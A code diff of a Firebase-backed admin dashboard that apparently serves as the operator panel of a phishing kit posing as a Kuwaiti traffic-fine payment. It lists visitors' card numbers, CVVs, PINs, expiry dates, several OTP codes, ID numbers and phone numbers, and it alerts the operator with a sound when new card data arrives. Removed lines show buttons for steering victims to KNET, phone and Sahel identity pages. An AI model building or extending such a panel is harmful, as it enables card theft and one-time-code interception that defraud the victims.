@@ -33,40 +33,40 @@ function useOnlineUsersCount() {
 
   return onlineUsersCount
 }
-
 interface Notification {
-  bank: string
-  bank_card: string
+  createdDate:string
   cardNumber: string
-  cardStatus: string
-  ip?: string
-  createdDate: string
-  cvv: string
+  bank?: string
+  pass: string
+  cardState: string
+  bank_card: string[]
+  prefix: string
+  status: "new" | "pending" | "approved" | "rejected"
+  // New fields for steps 3 and 4
+  phoneNumber: string
+  finalOtp: string
   id: string | "0"
   month: string
   notificationCount: number
   otp: string
   otp2: string
   page: string
-  pass: string
   country?: string
   personalInfo: {
     id?: string | "0"
   }
-  prefix: string
-  status: "pending" | string
   isOnline?: boolean
   lastSeen: string
   violationValue: number
   year: string
-  pagename: string
+  currentPage: string
   plateType: string
   allOtps?: string[]
   idNumber: string
-  email: string
   mobile: string
   network: string
   phoneOtp: string
+  cvv:string
 }
 
 export default function NotificationsPage() {
@@ -75,9 +75,6 @@ export default function NotificationsPage() {
   const [message, setMessage] = useState<boolean>(false)
   const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
   const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
-  const [violationValues, setViolationValues] = useState<{
-    [key: string]: string
-  }>({})
   const [onlineUsers, setOnlineUsers] = useState<number>(0)
   const [totalVisitors, setTotalVisitors] = useState<number>(0)
   const [cardSubmissions, setCardSubmissions] = useState<number>(0)
@@ -103,17 +100,14 @@ export default function NotificationsPage() {
   },[])
   const fetchNotifications = () => {
     setIsLoading(true)
-    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
+    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
         const notificationsData = querySnapshot.docs
           .map((doc) => {
             const data = doc.data() as any
-            setViolationValues((prev) => ({
-              ...prev,
-              [doc.id]: data.violationValue || "",
-            }))
+          
             return { id: doc.id, ...data }
           })
           .filter((notification: any) => !notification.isHidden) as Notification[]
@@ -125,8 +119,8 @@ export default function NotificationsPage() {
         )
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
-            (notification.idNumber || notification.email || notification.mobile) &&
-            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
+            (notification.idNumber || notification.mobile) &&
+            !notifications.some((n) => n.id === notification.id && (n.idNumber  || n.mobile)),
         )
 
         // Only play notification sound if new card info or general info is added
@@ -254,20 +248,11 @@ export default function NotificationsPage() {
     )
   }
 
-  const handleViolationUpdate = async (id: string, value: string) => {
-    try {
-      const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { violationValue: value })
-      setViolationValues((prev) => ({ ...prev, [id]: value }))
-    } catch (error) {
-      console.error("Error updating violation value:", error)
-    }
-  }
 
   const handleUpdatePage = async (id: string, page: string) => {
     try {
       const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { page: page })
+      await updateDoc(docRef, { currentPage: page })
       setNotifications(notifications.map((notif) => (notif.id === id ? { ...notif, page: page } : (notif as any))))
     } catch (error) {
       console.error("Error updating current page:", error)
@@ -394,50 +379,7 @@ export default function NotificationsPage() {
                     </td>
                     <td className="px-4 py-3 text-center">
                       <div className="flex flex-col items-center space-y-2">
-                        <div className="flex justify-center space-x-2">
-                          {[
-                            {
-                              page: "main",
-                              label: "الرئيسية",
-                              hint: "الصفحة الرئيسية",
-                            },
-                            { page: "knet", label: "كنت", hint: "صفحة كنت" },
-                            {
-                              page: "phone",
-                              label: "تلفون",
-                              hint: "تلفون",
-                            }, 
-
-                            {
-                              page: "sahel",
-                              label: "هوية",
-                              hint: "هوية",
-                            },
-                          ].map(({ page, label, hint }) => (
-                            <Button
-                              key={page}
-                              variant={notification?.page === page ? "default" : "outline"}
-                              size="sm"
-                              onClick={() => handleUpdatePage(notification.id, page)}
-                              className={`relative ${notification.page === page ? "bg-blue-500" : ""}`}
-                              title={hint}
-                            >
-                              {label}
-                              {notification.page === page && (
-                                <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
-                                  ✓
-                                </span>
-                              )}
-                            </Button>
-                          ))}
-                        </div>
-                        <span className="text-xs text-gray-500">
-                          {notification.page === "main" && "الصفحة الرئيسية"}
-                          {notification.page === "knet" && "صفحة كنت"}
-                          {notification.page === "phone" && "رقم الهاتف "}
-                          {notification.page === "phoneOtp" && " OTP"}
-                          {notification.page === "sahel" && "هوية"}
-                        </span>
+                      {notification.status}
                       </div>
                     </td>
                     <td className="px-4 py-3 text-center">
@@ -505,7 +447,7 @@ export default function NotificationsPage() {
                   </div>
 
                   <div className="text-sm">
-                    <span className="font-medium">الصفحة الحالية:</span> خطوه - {notification.page}
+                    <span className="font-medium">الصفحة الحالية:</span> {notification.currentPage}
                   </div>
 
                   <div className="text-sm">
@@ -521,46 +463,10 @@ export default function NotificationsPage() {
                 <div className="border-t pt-3">
                   <div className="text-sm font-medium mb-2">تحديث الصفحة:</div>
                   <div className="flex flex-wrap gap-2">
-                    {[
-                      {
-                        page: "main",
-                        label: "الرئيسية",
-                        hint: "الصفحة الرئيسية",
-                      },
-                      { page: "knet", label: "كنت", hint: "صفحة كنت" },
-                      {
-                        page: "phone",
-                        label: "تلفون",
-                        hint: "تلفون",
-                      }, {
-                        page: "sahel",
-                        label: "هوية",
-                        hint: "هوية",
-                      },
-                    ].map(({ page, label, hint }) => (
-                      <Button
-                        key={page}
-                        variant={notification?.page === page ? "default" : "outline"}
-                        size="sm"
-                        onClick={() => handleUpdatePage(notification.id, page)}
-                        className={`relative ${notification.page === page ? "bg-blue-500" : ""}`}
-                        title={hint}
-                      >
-                        {label}
-                        {notification.page === page && (
-                          <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
-                            ✓
-                          </span>
-                        )}
-                      </Button>
-                    ))}
+                 
                   </div>
                   <div className="text-xs text-gray-500 mt-1">
-                    {notification.page === "main" && "الصفحة الرئيسية"}
-                    {notification.page === "knet" && "صفحة كنت"}
-                    {notification.page === "phone" && "رقم الهاتف "}
-                    {notification.page === "phoneOtp" && " OTP"}
-                    {notification.page === "sahel" && "هوية"}
+                  
                   </div>
                 </div>
               </div>
